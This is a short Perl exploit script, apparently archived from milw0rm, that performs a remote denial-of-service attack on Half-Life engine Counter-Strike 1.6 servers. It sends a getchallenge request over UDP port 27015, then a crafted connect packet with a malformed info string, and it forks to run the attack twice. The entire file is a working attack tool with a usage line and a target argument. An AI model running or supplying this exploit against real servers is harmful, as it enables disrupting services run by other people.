#!/usr/bin/perl
# Server must not be running steam. /str0ke


# Half-Life engine remote DoS exploit
# bug found by Firestorm
# tested against cstrike 1.6 Windows build-in server, cstrike 1.6 linux dedicated server
use IO::Socket;
die "usage: ./csdos <host>" unless $ARGV[0];
$host=$ARGV[0];

if (fork())
{       econnect($host); }
else
{ econnect($host); };
exit;

sub econnect($)
{
        my $host=$_[0];
        my $sock = new
IO::Socket::INET(PeerAddr=>$host,PeerPort=>'27015',Proto=>'udp');
        die "Could not create socket: $!\n" unless $sock;
        $cmd="\xff\xff\xff\xff";
        syswrite $sock, $cmd."getchallenge";

        sysread $sock,$b,65535;  print $b,"\n";
        @c=split(/ /,$b);

        $c2=$c[1];

        $q=$cmd."connect 47 $c2 \"\\prot\\4\\unique\\0\\raw\\valve\\cdkey\\f0ef8a36258af1bb64ed866538c9db76\"\"\\\"\0\0";
print '>',$q,"\n";
syswrite $sock, $q;
sysread $sock,$b,65535; print $b,"\n";
sleep 3;
close $sock;
}

# milw0rm.com [2006-02-11]
